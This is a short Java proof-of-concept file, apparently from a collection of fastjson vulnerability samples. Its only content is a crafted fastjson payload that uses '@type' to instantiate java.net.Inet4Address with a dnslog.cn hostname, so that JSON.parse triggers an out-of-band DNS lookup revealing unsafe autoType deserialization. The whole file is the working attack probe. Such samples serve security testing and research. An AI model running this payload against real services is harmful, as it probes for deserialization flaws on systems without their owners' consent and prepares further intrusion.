package com.threedr3am.bug.fastjson.dns;

import com.alibaba.fastjson.JSON;

public class Inet4AddressPoc {

    public static void main(String[] args) {
        String payload = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"ejqqei.dnslog.cn\n\"}";
        try {
            JSON.parse(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
